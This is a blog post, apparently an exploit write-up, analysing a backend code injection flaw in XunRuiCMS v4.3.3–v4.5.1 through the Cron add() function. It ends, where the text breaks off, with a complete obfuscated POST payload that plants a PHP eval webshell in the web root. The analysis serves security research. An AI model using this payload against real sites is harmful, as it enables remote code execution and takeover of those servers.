<!DOCTYPE html>
<html lang="en" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="XunRuiCMS v4.3.3 to v4.5.1">
<title>XunRuiCMS v4.3.3 to v4.5.1 backstage code injection vulnerability(file write and file inclusion)</title>

<link rel='canonical' href='https://weltolk.github.io/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/'>

<link rel="stylesheet" href="/scss/style.min.e8c7fca7d1c9294aa7a4f3426c225ee26540f7d94e39be0b5a4a5c8a49ca5a25.css"><meta property='og:title' content="XunRuiCMS v4.3.3 to v4.5.1 backstage code injection vulnerability(file write and file inclusion)">
<meta property='og:description' content="XunRuiCMS v4.3.3 to v4.5.1">
<meta property='og:url' content='https://weltolk.github.io/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/'>
<meta property='og:site_name' content='Weltolk'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='expliot-db' /><meta property='article:published_time' content='2022-04-26T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-04-26T00:00:00&#43;00:00'/><meta property='og:image' content='https://weltolk.github.io/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/expliot-db.png' />
<meta name="twitter:title" content="XunRuiCMS v4.3.3 to v4.5.1 backstage code injection vulnerability(file write and file inclusion)">
<meta name="twitter:description" content="XunRuiCMS v4.3.3 to v4.5.1"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://weltolk.github.io/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/expliot-db.png' />
    <link rel="shortcut icon" href="/img/favicon.png" />

  


    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/infomation_hu70b388befb54006d4dcf3b6c8c0484a4_1176591_300x0_resize_box_3.png" width="300"
                            height="225" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">üç•</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Weltolk</a></h1>
            <h2 class="site-description">2u94 4 4un</h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://github.com/Weltolk'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/links/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        <li class="menu-bottom-section">
            <ol class="menu">
                    
                        <li id="i18n-switch">  
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M4 5h7" />
  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
  <path d="M12 20l4 -9l4 9" />
  <path d="M19.1 18h-6.2" />
</svg>



                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
                                
                                    <option value="https://weltolk.github.io/" selected>English</option>
                                
                                    <option value="https://weltolk.github.io/zh-cn/" >‰∏≠Êñá</option>
                                
                            </select>
                        </li>
                    
                

                
                    <li id="dark-mode-toggle">
                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                        <span>Dark Mode</span>
                    </li>
                
            </ol>
        </li>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#prerequisite">prerequisite</a></li>
    <li><a href="#environment-setup">environment setup</a></li>
    <li><a href="#vulnerability-description">vulnerability description</a></li>
    <li><a href="#vulnerability-principle">vulnerability principle</a>
      <ol>
        <li><a href="#before-version-v433">before version v4.3.3</a></li>
        <li><a href="#under-versions-v433-to-v450">Under versions v4.3.3 to v4.5.0</a>
          <ol>
            <li><a href="#analysis-of-add-function">analysis of add() function</a></li>
            <li><a href="#bypass-json-encoding-and-xss-cleaning-and-package--in-writepathconfigcronphp-file">Bypass JSON encoding and &ldquo;XSS cleaning&rdquo; and package <code>'</code> in <code>WRITEPATH.'config/cron.php'</code> file</a></li>
            <li><a href="#include-the-writepathconfigcronphp-file-written-to">include the <code>WRITEPATH.'config/cron.php'</code> file written to</a></li>
          </ol>
        </li>
        <li><a href="#version-v451">version v4.5.1</a>
          <ol>
            <li><a href="#bypass-the-json-encoding-xss-cleaning-dr_safe_filename-function-filtering-and-packages-in-writepathconfigcronphp-file">bypass the JSON encoding, &ldquo;XSS cleaning&rdquo;, dr_safe_filename() function filtering and packages in <code>WRITEPATH.'config/cron.php'</code> file</a></li>
            <li><a href="#include-the-writepathconfigcronphp-file-written-to-1">include the <code>WRITEPATH.'config/cron.php'</code> file written to</a></li>
          </ol>
        </li>
        <li><a href="#after-version-v451">after version v4.5.1</a></li>
      </ol>
    </li>
    <li><a href="#poc--exp">POC &amp;&amp; EXP</a>
      <ol>
        <li><a href="#poc">POC</a></li>
        <li><a href="#exp">EXP</a></li>
      </ol>
    </li>
    <li><a href="#xss_clean-function">xss_clean() function</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/">
                <img src="/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_800x0_resize_box_3.png"
                        srcset="/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_800x0_resize_box_3.png 800w, /p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/expliot-db_hud9700ca58d822386b8178068bd5ae476_8790_1600x0_resize_box_3.png 1600w"
                        width="800" 
                        height="240" 
                        loading="lazy"
                        alt="Featured image of post XunRuiCMS v4.3.3 to v4.5.1 backstage code injection vulnerability(file write and file inclusion)" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/expliot-db/" >
                Expliot-Db
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/xunruicms-v4.3.3-to-v4.5.1-backstage-code-injection-vulnerabilityfile-write-and-file-inclusion/">XunRuiCMS v4.3.3 to v4.5.1 backstage code injection vulnerability(file write and file inclusion)</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            XunRuiCMS v4.3.3 to v4.5.1
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Apr 26, 2022</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    9 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h2 id="prerequisite">prerequisite
</h2><p>two conditions:</p>
<p>1.XunRuiCMS version is v4.3.3 to v4.5.1</p>
<p>2.You can log in to the background,And it is an administrator account or have the management permission of &ldquo;Â∫îÁî®&rdquo;-&gt;&ldquo;‰ªªÂä°ÈòüÂàó&rdquo;</p>
<h2 id="environment-setup">environment setup
</h2><ol>
<li>
<p>install and configure php and web middleware, note that the low version of the cms requires a low version of php</p>
</li>
<li>
<p>clone the official open source address of the cms <a class="link" href="https://gitee.com/dayrui/xunruicms"  target="_blank" rel="noopener"
    >https://gitee.com/dayrui/xunruicms</a></p>
</li>
<li>
<p>search for the version number in the commit message to fall back to the specified version</p>
</li>
</ol>
<p>In PhpStorm, right-click the specified commit version and select &ldquo;Reset Current Branch to Here&rdquo;.</p>
<p>Select &ldquo;Hard&rdquo; and click &ldquo;Reset&rdquo;.</p>
<ol start="4">
<li>Access, install, and login to the backend</li>
</ol>
<p>Backend address:<code>/admin.php</code></p>
<p>Translated with <a class="link" href="https://www.DeepL.com/Translator"  target="_blank" rel="noopener"
    >www.DeepL.com/Translator</a> (free version)</p>
<h2 id="vulnerability-description">vulnerability description
</h2><p>Admin controller folder, Cron.php controller, add() function, there is no special filtering for user input, this will cause the attacker to execute the attack when he has administrator privileges or administrative privileges of &ldquo;Â∫îÁî®&rdquo;-&gt;&ldquo;‰ªªÂä°ÈòüÂàó&rdquo;, write anything to the <code>WRITEPATH.'config/cron.php'</code>, at the same time, the file has multiple points that can be executed and utilized, under normal circumstances, the above trigger conditions can stably trigger the vulnerability</p>
<h2 id="vulnerability-principle">vulnerability principle
</h2><h3 id="before-version-v433">before version v4.3.3
</h3><p>before version v4.3.3, there is no &ldquo;add()&rdquo; function under &ldquo;cron.php&rdquo;</p>
<h3 id="under-versions-v433-to-v450">Under versions v4.3.3 to v4.5.0
</h3><p>1.The CMS, with the above permissions, Can be accessed through <code>http://host:port/Admin.php?c=Cron&amp;m=add</code> call the add() function of the Cron.php controller under the Admin controller folder</p>
<p>2.code of add() function:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// ‰ªªÂä°Á±ªÂûã
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">public</span> <span class="k">function</span> <span class="nf">add</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$json</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">require</span> <span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">IS_AJAX_POST</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$post</span> <span class="o">=</span> <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;&lt;?php defined(\&#39;FCPATH\&#39;) OR exit(\&#39;No direct script access allowed\&#39;);&#39;</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="o">.</span><span class="s1">&#39; $json=\&#39;&#39;</span><span class="o">.</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$post</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;\&#39;;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">system_log</span><span class="p">(</span><span class="s1">&#39;ËÆæÁΩÆËá™ÂÆö‰πâ‰ªªÂä°Á±ªÂûã&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nx">dr_lang</span><span class="p">(</span><span class="s1">&#39;Êìç‰ΩúÊàêÂäü&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;data&#39;</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">V</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">display</span><span class="p">(</span><span class="s1">&#39;cron_add.html&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="analysis-of-add-function">analysis of add() function
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">is_file</span><span class="p">(</span><span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">require</span> <span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The add() function will first include the <code>WRITEPATH.'config/cron.php'</code> file when it exists, <code>WRITEPATH</code> can be configured in index.php under the root directory of the website, By default, it is <code>cache/</code> under the root directory of the website</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$json</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then the add() function assigns <code>Null</code> to <code>$data</code> through the <code>json_decode($json, true)</code> function</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">IS_AJAX_POST</span><span class="p">){}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then enter an if branch statement, When <code>IS_AJAX_POST</code>, then execute the relevant code written to the file, otherwise, skip writing to the file, show cron&rsquo;s add page, the add() function ends, <code>IS_AJAX_POST</code> is defined as returning <code>TRUE</code> when a post request is received and the content of post is not empty, otherwise, return to <code>FALSE</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$post</span> <span class="o">=</span> <span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">post</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In if statement, first <code>\Phpcmf\Service::L('input')-&gt;post('data', true)</code> The code calls the post() function of class Input defined in the Input.php file, When a post request is received and the key is <code>data</code>, perform &ldquo;XSS cleaning&rdquo; and return, otherwise, return to <code>false</code> directly, then assign it to <code>$post</code>, the code of &ldquo;XSS cleaning&rdquo; is relatively long, I put it at the end of this article, the &ldquo;XSS cleaning&rdquo; here can be easily bypassed, so as to write whatever we want</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span><span class="nx">WRITEPATH</span><span class="o">.</span><span class="s1">&#39;config/cron.php&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;&lt;?php defined(\&#39;FCPATH\&#39;) OR exit(\&#39;No direct script access allowed\&#39;);&#39;</span><span class="o">.</span><span class="nx">PHP_EOL</span><span class="o">.</span><span class="s1">&#39; $json=\&#39;&#39;</span><span class="o">.</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$post</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;\&#39;;&#39;</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In if statement, post request received, then, the received content is encoded by JSON and written into <code>WRITEPATH.'config/cron.php'</code> file, the controllable write point is located in the assignment of string <code>$json</code>, and in the package of two <code>'</code>&rsquo;s, here is the main reason for the vulnerability, write the corresponding file without making sufficient judgment or cleaning on the user&rsquo;s input</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">\Phpcmf\Service</span><span class="o">::</span><span class="na">L</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">system_log</span><span class="p">(</span><span class="s1">&#39;ËÆæÁΩÆËá™ÂÆö‰πâ‰ªªÂä°Á±ªÂûã&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_json</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nx">dr_lang</span><span class="p">(</span><span class="s1">&#39;Êìç‰ΩúÊàêÂäü&#39;</span><span class="p">));</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>End of if statement, write log and display operation results, the cron add interface is displayed, and the add() function ends</p>
<h4 id="bypass-json-encoding-and-xss-cleaning-and-package--in-writepathconfigcronphp-file">Bypass JSON encoding and &ldquo;XSS cleaning&rdquo; and package <code>'</code> in <code>WRITEPATH.'config/cron.php'</code> file
</h4><p>Through the above analysis, we can find that, the add() function basically has no special precautions against user input, as long as we bypass the &ldquo;XSS cleaning&rdquo; and JSON encoding and the package <code>'</code> in the <code>WRITEPATH.'config/cron.php'</code> file, we can write whatever we want</p>
<p>The following is one of my methods. In the <code>WRITEPATH.'config/cron.php'</code> file, write the PHP statement of a file named webshell.php with the content of <code>&lt;?php eval(@$_POST[&quot;password&quot;]);?&gt;</code> in the root directory of the website when running the <code>WRITEPATH.'config/cron.php'</code> file</p>
<p>Note that the following operations need to obtain csrf_test_name first and obtain the method:</p>
<p>1.Visit <code>http://host:port/Admin.php?c=Cron&amp;m=add</code></p>
<p>2.Capture the post package sent when clicking &ldquo;save&rdquo;</p>
<p>3.csrf_test_name in the content of post can be used as csrf_test_name for a period of time</p>
<p>After obtaining csrf_test_name&quot;, give <code>http://host:port/Admin.php?c=Cron&amp;m=add</code> post the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">isform=1&amp;csrf_test_name=3318a4fabdf4ea654734315a4d508a5f&amp;data%5B1%5D%5Bname%5D=&amp;data%5B1%5D%5Bcode%5D=%5B&#39;;file_put_contents(&#39;webshell.php&#39;,htmlspecialchars_decode(&#39;&lt;&#39;).&#39;?php%20eval&#39;.base64_decode(&#39;KA==&#39;).&#39;@$_POST%5B&#39;.base64_decode(&#39;Ig==&#39;).&#39;password&#39;.base64_decode(&#39;Ig==&#39;).&#39;%5D&#39;.base64_decode(&#39;KQ==&#39;).&#39;;?&#39;.htmlspecialchars_decode(&#39;&gt;&#39;));return;&#39;%5D
